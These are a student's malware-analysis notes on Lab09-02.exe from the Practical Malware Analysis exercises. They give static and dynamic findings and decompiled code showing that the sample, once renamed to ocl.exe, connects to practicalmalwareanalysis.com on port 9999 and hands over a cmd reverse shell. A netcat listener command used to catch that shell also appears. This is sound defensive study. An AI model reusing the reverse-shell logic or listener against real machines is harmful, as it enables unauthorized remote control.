Lab09-02.exe
    PE Analysis
        # Virustotal
            41/72
            SHA-256: f153dfacec09dd69809c3bbf68270a38ee3701f44220c7bf181c14a68c138133

            PEiD packer
                Microsoft Visual C++

            TimeStamp (IMAGE_FILE_HEADER): 2011-04-30 16:41:06

            Subsystem: Windows GUI
            
            Sections
                Name	Virtual Address	Virtual Size	Raw Size	Entropy	MD5
                .text	4096	11366	12288	6.25	6bc8373e9f753cd282af864ad71269c2
                .rdata	16384	2000	4096	3.17	40e860eea4ba1be6d0d3936b0dbbf076
                .data	20480	2012	4096	0.69	6103ee24e83b7788dacddba6a1fb83d0

            IMPORT
                KERNEL32.DLL
                    HeapFree
                    GetStdHandle
                    LCMapStringW
                    SetHandleCount
                    WaitForSingleObject
                    GetOEMCP
                    LCMapStringA
                    HeapDestroy
                    ExitProcess
                    GetEnvironmentStringsW
                    GetModuleFileNameA
                    RtlUnwind
                    LoadLibraryA
                    FreeEnvironmentStringsA
                    GetCurrentProcess
                    GetEnvironmentStrings
                    GetCPInfo
                    UnhandledExceptionFilter
                    MultiByteToWideChar
                    FreeEnvironmentStringsW
                    GetCommandLineA
                    GetProcAddress
                    WideCharToMultiByte
                    GetStringTypeA
                    WriteFile
                    GetStartupInfoA
                    GetACP
                    HeapReAlloc
                    GetStringTypeW
                    TerminateProcess
                    CreateProcessA
                    HeapCreate
                    VirtualFree
                    Sleep
                    GetFileType
                    HeapAlloc
                    GetVersion
                    VirtualAlloc
                WS2_32.DLL
                    WSASocketA
                    WSACleanup
                    WSAStartup
                    gethostbyname
                    connect
                    htons
                    closesocket

        # strings.exe (Only part of the results)
            cmd

    Dynamic Analysis
        # RegShot (Part of results)
            ----------------------------------
            Values modified:1
            ----------------------------------
            HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed: 9A 41 96 FF C6 D3 1A 13 FD 14 8C 54 D1 94 43 61 85 6D 86 0F D0 AD C3 2C B7 B1 22 21 D4 78 D4 C3 61 C2 C1 FF 0C 90 C4 2B C6 51 A8 EE 85 43 63 D7 21 AF 9D 34 0D 58 5B 6E AF 30 35 95 F8 14 F8 CE 25 F4 3F 88 62 8F 06 CD C5 A0 43 3A 8C 43 52 DF
            HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed: 7A 07 80 84 21 70 A4 6D 31 AD FE 52 D0 8F 51 4B 6A 71 C9 F6 2C D7 45 BD F5 DF 85 7C F1 25 E5 CE 16 A9 28 9C B4 25 FA 82 BF 9E D5 4A 66 D7 23 5D 79 AD 16 18 BD C5 D2 72 7E F7 40 C2 2B 65 37 18 61 AB 97 DB DD 9C CD B5 BA C1 68 E7 90 96 B3 E0

        # procexp (View > Lower Pane View > DLLS / Handles)
            NULL

        # procmon
            NULL
                
        # autoruns
            NULL

        # ApateDNS
            ocl.exe

            C9 CA 01 00 00 01 00 00  00 00 00 00 03 77 77 77            ÉÊ···········www
            18 70 72 61 63 74 69 63  61 6C 6D 61 6C 77 61 72            ·practicalmalwar
            65 61 6E 61 6C 79 73 69  73 03 63 6F 6D 00 00 01            eanalysis·com···
            00 01 00 00                                                 ···· 

        # Wireshark
            Microsoft Windows XP [Version 5.1.2600]
            (C) Copyright 1985-2001 Microsoft Corp.

            C:\Documents and Settings\practice\Desktop>
        
        # Netcat
            osboxes@osboxes:~$ sudo nc -lvvp 9999
            Listening on [0.0.0.0] (family 0, port 9999)
            Connection from [10.0.0.2] port 9999 [tcp/*] accepted (family 2, sport 1236)
            Microsoft Windows XP [Version 5.1.2600]
            (C) Copyright 1985-2001 Microsoft Corp.

            C:\Documents and Settings\practice\Desktop>whoami

        # IDA Pro & OllyDbg
            v13 = '1';
            v14 = 'q';
            v15 = 'a';
            v16 = 'z';
            v17 = '2';
            v18 = 'w';
            v19 = 's';
            v20 = 'x';
            v21 = '3';
            v22 = 'e';
            v23 = 'd';
            v24 = 'c';
            v25 = '\0';
            v26 = 'o';
            v27 = 'c';
            v28 = 'l';
            v29 = '.';
            v30 = 'e';
            v31 = 'x';
            v32 = 'e';
            v33 = '\0';
            qmemcpy(&v8, &asc_405034, 0x21u);
            v11 = 0;
            Filename = 0;
            memset(&v6, 0, 0x10Cu);
            v7 = 0;
            GetModuleFileNameA(0, &Filename, 0x10Eu);
            v36 = strrchr(&Filename, 92) + 1;             // 92 -> \, get the string after the last '\'.    ; e.g C:\..\Lab09-02.exe -> Lab09-02.exe
            if ( strcmp(&v26, v36) )                      // ocl.exe
                return 1;

            CPU Disasm
            Address   Hex dump          Command                                  Comments
            0040122E  |.  50            PUSH EAX                                 ; /Arg2 = ASCII "Lab09-02.exe"
            0040122F  |.  8D8D 60FEFFFF LEA ECX,[LOCAL.104]                      ; |
            00401235  |.  51            PUSH ECX                                 ; |Arg1 = ASCII "ocl.exe"              // Need to rename to ocl.exe
            00401236  |.  E8 85020000   CALL 004014C0                            ; strcmp

            name = sub_401089(&v13, (int)&v8);                                  // ?
            v10 = gethostbyname(name);

            CPU Disasm
            Address   Hex dump          Command                                  Comments
            004012CB  |.  50            |PUSH EAX                                ; /Arg1 = ASCII "www.practicalmalwareanalysis.com"
            004012CC  |.  FF15 A4404000 |CALL DWORD PTR DS:[<&WS2_32.#52>]       ; \WS2_32.gethostbyname
            
            *(_WORD *)v9.sa_data = htons(9999u);                                // port 9999

            if ( v12 != -1 )                                                    // connect success!
            sub_401000(
            *(_DWORD *)&v9.sa_family,
            *(_DWORD *)&v9.sa_data[2],
            *(_DWORD *)&v9.sa_data[6],
            *(_DWORD *)&v9.sa_data[10],
            s);

            int __cdecl sub_401000(int a1, int a2, int a3, int a4, void *a5)
            {
            struct _STARTUPINFOA StartupInfo; // [esp+0h] [ebp-58h]
            BOOL v7; // [esp+44h] [ebp-14h]
            struct _PROCESS_INFORMATION ProcessInformation; // [esp+48h] [ebp-10h]

            v7 = 0;
            memset(&StartupInfo, 0, 0x44u);
            StartupInfo.cb = 68;
            memset(&ProcessInformation, 0, 0x10u);
            StartupInfo.dwFlags = 257;
            StartupInfo.wShowWindow = 0;
            StartupInfo.hStdInput = a5;
            StartupInfo.hStdError = a5;
            StartupInfo.hStdOutput = a5;
            v7 = CreateProcessA(0, CommandLine, 0, 0, 1, 0, 0, 0, &StartupInfo, &ProcessInformation);       // cmd reverse shell
            WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFF);
            return 0;
            }

Analysis
    The malware need to be renamed to ocl.exe then it will execute correctly. And it will try to connect the foreign host www.practicalmalwareanalysis.com:9999, if success it will reverse a cmd shell to the remote host.